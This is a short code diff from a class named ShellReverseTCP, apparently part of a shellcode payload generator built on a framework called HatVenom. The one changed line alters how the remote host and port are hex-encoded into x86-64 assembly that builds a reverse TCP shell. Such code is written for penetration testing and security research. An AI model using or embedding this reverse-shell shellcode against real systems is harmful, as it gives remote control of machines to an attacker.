@@ -51,7 +51,7 @@ class ShellReverseTCP(HatVenom):
 
             mov r12, rax
 
-            mov r13, 0x{rhost}{rport}0101
+            mov r13, 0x{rhost.hex()}{rport.hex()}0101
             mov r9b, 0xff
             sub r13, r9
             push r13
